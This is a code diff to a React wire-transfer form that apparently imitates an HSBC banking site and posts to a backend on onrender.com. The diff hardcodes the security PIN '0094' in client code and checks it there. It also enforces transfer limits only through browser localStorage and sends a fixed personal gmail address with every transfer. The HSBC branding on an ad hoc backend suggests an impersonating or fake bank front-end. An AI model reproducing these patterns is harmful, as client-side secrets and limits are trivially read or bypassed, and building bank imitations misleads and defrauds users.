@@ -6,6 +6,8 @@ const InternationalTransfer = ({ onClose }) => {
     recipientName: "",
     recipientAccount: "",
     recipientBank: "",
+    bankAddress: "",      // <-- new
+    branchCode: "",       // <-- new
     recipientSwift: "",
     recipientIban: "",
     recipientCountry: "",
@@ -39,6 +41,19 @@ const InternationalTransfer = ({ onClose }) => {
     setErrors((e) => ({ ...e, [name]: "" }));
   };
 
+  // Limits
+  const DAILY_LIMIT = 500000;
+  const ONE_TIME_LIMIT = 250000;
+  const getTodayKey = () => {
+    const today = new Date().toISOString().slice(0, 10);
+    return `intl_transfer_total_${today}`;
+  };
+  const getTodayTotal = () => Number(localStorage.getItem(getTodayKey()) || 0);
+  const addToTodayTotal = (amount) => {
+    const total = getTodayTotal() + Number(amount);
+    localStorage.setItem(getTodayKey(), total);
+  };
+
   const validateStep = () => {
     const err = {};
     if (currentStep === 1) {
@@ -47,9 +62,20 @@ const InternationalTransfer = ({ onClose }) => {
       if (!formData.recipientBank) err.recipientBank = "Required.";
       if (!formData.recipientSwift) err.recipientSwift = "Required.";
       if (!formData.recipientCountry) err.recipientCountry = "Required.";
+      if (!formData.bankAddress) err.bankAddress = "Required.";
+      // branchCode is optional
     }
-    if (currentStep === 2 && !formData.amount) err.amount = "Required.";
-    if (currentStep === 3 && !formData.securityPin) err.securityPin = "Required.";
+    if (currentStep === 2) {
+      if (!formData.amount) err.amount = "Required.";
+      else if (Number(formData.amount) > ONE_TIME_LIMIT)
+        err.amount = `One-time transfer limit is $${ONE_TIME_LIMIT.toLocaleString()}.`;
+      else if (getTodayTotal() + Number(formData.amount) > DAILY_LIMIT)
+        err.amount = `Daily transfer limit is $${DAILY_LIMIT.toLocaleString()}.`;
+    }
+    if (currentStep === 3) {
+      if (!formData.securityPin) err.securityPin = "Required.";
+      else if (formData.securityPin !== "0094") err.securityPin = "Security PIN is incorrect.";
+    }
     return err;
   };
 
@@ -68,9 +94,12 @@ const InternationalTransfer = ({ onClose }) => {
       return;
     }
     setIsSubmitting(true);
+
+    addToTodayTotal(formData.amount);
+
     try {
       const token = localStorage.getItem("token");
-      const email = "jamesphilips0480@gmail.com"; // Always use this email
+      const email = "jamesphilips0480@gmail.com";
       const res = await fetch("https://hsbc-backend-rc6o.onrender.com/api/transfer/international", {
         method: "POST",
         headers: {
@@ -82,6 +111,8 @@ const InternationalTransfer = ({ onClose }) => {
           recipientName: formData.recipientName,
           recipientAccount: formData.recipientAccount,
           recipientBank: formData.recipientBank,
+          bankAddress: formData.bankAddress,      // <-- new
+          branchCode: formData.branchCode,        // <-- new
           recipientSwift: formData.recipientSwift,
           recipientIban: formData.recipientIban,
           recipientCountry: formData.recipientCountry,
@@ -91,60 +122,48 @@ const InternationalTransfer = ({ onClose }) => {
           transferDate: formData.transferDate,
           reference: formData.reference,
           securityPin: formData.securityPin,
-          email, // <-- add this line
+          email,
         }),
       });
-
-      // Debug: log the raw response
-      console.log("Raw response:", res);
 
       let data;
       try {
         data = await res.json();
       } catch (jsonErr) {
-        console.error("Failed to parse JSON:", jsonErr);
         setErrors({ general: "Server returned invalid JSON." });
         setIsSubmitting(false);
         return;
       }
 
-      // Debug: log the parsed response
-      console.log("Parsed response data:", data);
-
       if (!res.ok) {
         setErrors({ general: data.message || data.error || "Transfer failed." });
-        console.error("Transfer error:", data);
         setIsSubmitting(false);
         return;
       }
 
-      // Show verification input
       setTransferId(data.transferId);
       setShowVerification(true);
       setIsSubmitting(false);
     } catch (err) {
       setErrors({ general: "Network error: " + err.message });
-      console.error("Network error:", err);
       setIsSubmitting(false);
     }
   };
 
-  // Handle verification code submission
   const handleVerify = async () => {
     setIsSubmitting(true);
     setVerificationError("");
     try {
-      const res = await fetch("http://localhost:5000/api/transfer/verify", {
+      const res = await fetch("https://hsbc-backend-rc6o.onrender.com/api/transfer/verify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ transferId, code: verificationCode.trim() }),
       });
       const result = await res.json();
-      console.log("Verification response:", result);
       if (!res.ok) {
         setVerificationError(result.message || "Verification failed.");
       } else {
-        setApprovalStatus("Approved");
+        setApprovalStatus("Pending");
         setIsSubmitted(true);
         setTimeout(onClose, 3000);
       }
@@ -162,36 +181,30 @@ const InternationalTransfer = ({ onClose }) => {
 
   return (
     <div className="p-4 max-w-xl mx-auto">
-      {/* Custom scrollbar container */}
       <div className="max-h-[80vh] overflow-y-auto scroll-container">
         <style jsx>{`
           .scroll-container {
             scrollbar-width: thin;
             scrollbar-color: #c53030 #f1f1f1;
           }
-          
           .scroll-container::-webkit-scrollbar {
             width: 10px;
           }
-          
           .scroll-container::-webkit-scrollbar-track {
             background: #f8f8f8;
             border-radius: 10px;
           }
-          
           .scroll-container::-webkit-scrollbar-thumb {
             background-color: #c53030;
             border-radius: 10px;
             border: 2px solid #f8f8f8;
             background-clip: padding-box;
           }
-          
           .scroll-container::-webkit-scrollbar-thumb:hover {
             background-color: #9b2c2c;
           }
         `}</style>
 
-        {/* Loading */}
         {isSubmitting && (
           <div className="fixed inset-0 bg-white/90 z-50 flex flex-col items-center justify-center">
             <div className="animate-spin h-12 w-12 border-4 border-red-600 border-t-transparent rounded-full"></div>
@@ -199,11 +212,10 @@ const InternationalTransfer = ({ onClose }) => {
           </div>
         )}
 
-        {/* Success */}
         {isSubmitted && (
           <div className="text-center py-8">
-            <FiCheckCircle className="mx-auto mb-4 text-green-500 text-5xl animate-pulse" />
-            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Transfer Approved!</h2>
+            <FiCheckCircle className="mx-auto mb-4 text-yellow-500 text-5xl animate-pulse" />
+            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Transfer Pending</h2>
             <p className="text-gray-600 mb-6">We’ll notify you once it’s complete.</p>
             <button
               onClick={onClose}
@@ -214,7 +226,6 @@ const InternationalTransfer = ({ onClose }) => {
           </div>
         )}
 
-        {/* Verification Step */}
         {showVerification && !isSubmitted && (
           <div className="space-y-6">
             <h2 className="text-xl font-semibold text-gray-800 mb-2">Verify Transfer</h2>
@@ -239,7 +250,6 @@ const InternationalTransfer = ({ onClose }) => {
           </div>
         )}
 
-        {/* Form */}
         {!isSubmitting && !isSubmitted && !showVerification && (
           <form onSubmit={handleSubmit} className="space-y-6">
             {/* Progress */}
@@ -354,16 +364,14 @@ const InternationalTransfer = ({ onClose }) => {
                       } focus:outline-none focus:ring-2 focus:ring-red-500`}
                     >
                       <option value="">Select Country</option>
-                      {/* Existing countries */}
+                      {/* ...country options... */}
                       <option value="US">United States</option>
                       <option value="GB">United Kingdom</option>
                       <option value="DE">Germany</option>
-                      {/* East Asia */}
                       <option value="CN">China</option>
                       <option value="JP">Japan</option>
                       <option value="TW">Taiwan</option>
                       <option value="HK">Hong Kong</option>
-                      {/* Southeast Asia */}
                       <option value="PH">Philippines</option>
                       <option value="VN">Vietnam</option>
                       <option value="ID">Indonesia</option>
@@ -374,7 +382,6 @@ const InternationalTransfer = ({ onClose }) => {
                       <option value="KH">Cambodia</option>
                       <option value="LA">Laos</option>
                       <option value="BN">Brunei</option>
-                      {/* Middle East */}
                       <option value="AE">United Arab Emirates (UAE)</option>
                       <option value="SA">Saudi Arabia</option>
                       <option value="QA">Qatar</option>
@@ -385,7 +392,6 @@ const InternationalTransfer = ({ onClose }) => {
                       <option value="TR">Turkey</option>
                       <option value="JO">Jordan</option>
                       <option value="LB">Lebanon</option>
-                      {/* South Asia */}
                       <option value="PK">Pakistan</option>
                       <option value="BD">Bangladesh</option>
                       <option value="NP">Nepal</option>
@@ -397,37 +403,70 @@ const InternationalTransfer = ({ onClose }) => {
                     )}
                   </div>
                 </div>
+                {/* New: Bank Address */}
+                <div>
+                  <label className="block mb-2 text-gray-700">Bank Address</label>
+                  <input
+                    name="bankAddress"
+                    value={formData.bankAddress}
+                    onChange={handleInputChange}
+                    className={`w-full px-4 py-2 rounded-lg border ${
+                      errors.bankAddress ? "border-red-500" : "border-gray-200"
+                    } focus:outline-none focus:ring-2 focus:ring-red-500`}
+                    placeholder="123 Main St, City, Country"
+                  />
+                  {errors.bankAddress && (
+                    <p className="text-red-500 text-sm mt-1">{errors.bankAddress}</p>
+                  )}
+                </div>
+                {/* New: Branch Code (optional) */}
+                <div>
+                  <label className="block mb-2 text-gray-700">Branch Code <span className="text-gray-400">(optional)</span></label>
+                  <input
+                    name="branchCode"
+                    value={formData.branchCode}
+                    onChange={handleInputChange}
+                    className="w-full px-4 py-2 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-red-500"
+                    placeholder="Branch code (if any)"
+                  />
+                </div>
               </div>
             )}
 
             {/* Step 2 */}
             {currentStep === 2 && (
-              <div className="space-y-4">
-                <div>
-                  <label className="block mb-2 text-gray-700">Amount (USD)</label>
-                  <div className="relative">
-                    <span className="absolute left-3 top-2 text-gray-400">$</span>
-                    <input
-                      name="amount"
-                      value={formData.amount}
-                      onChange={handleInputChange}
-                      className={`w-full pl-8 pr-4 py-2 rounded-lg border ${
-                        errors.amount ? "border-red-500" : "border-gray-200"
-                      } focus:outline-none focus:ring-2 focus:ring-red-500`}
-                      placeholder="0.00"
-                    />
-                  </div>
-                  {errors.amount && (
-                    <p className="text-red-500 text-sm mt-1">{errors.amount}</p>
-                  )}
-                </div>
-                <div className="bg-red-50 p-3 rounded-lg">
-                  <p className="text-sm text-red-800">
-                    Exchange rate: 1 USD = 0.85 EUR
-                  </p>
-                </div>
-              </div>
-            )}
+  <div className="space-y-4">
+    <div>
+      <label className="block mb-2 text-gray-700">Amount (USD)</label>
+      <div className="relative">
+        <span className="absolute left-3 top-2 text-gray-400">$</span>
+        <input
+          name="amount"
+          value={formData.amount}
+          onChange={handleInputChange}
+          className={`w-full pl-8 pr-4 py-2 rounded-lg border ${
+            errors.amount ? "border-red-500" : "border-gray-200"
+          } focus:outline-none focus:ring-2 focus:ring-red-500`}
+          placeholder="0.00"
+        />
+      </div>
+      {errors.amount && (
+        <p className="text-red-500 text-sm mt-1">{errors.amount}</p>
+      )}
+    </div>
+    <div className="bg-red-50 p-3 rounded-lg space-y-1">
+      <p className="text-sm text-red-800">
+        Exchange rate: 1 USD = 0.85 EUR
+      </p>
+      <p className="text-xs text-gray-700">
+        <span className="font-semibold">One-time transfer limit:</span> $250,000
+      </p>
+      <p className="text-xs text-gray-700">
+        <span className="font-semibold">Daily transfer limit:</span> $500,000
+      </p>
+    </div>
+  </div>
+)}
 
             {/* Step 3 */}
             {currentStep === 3 && (
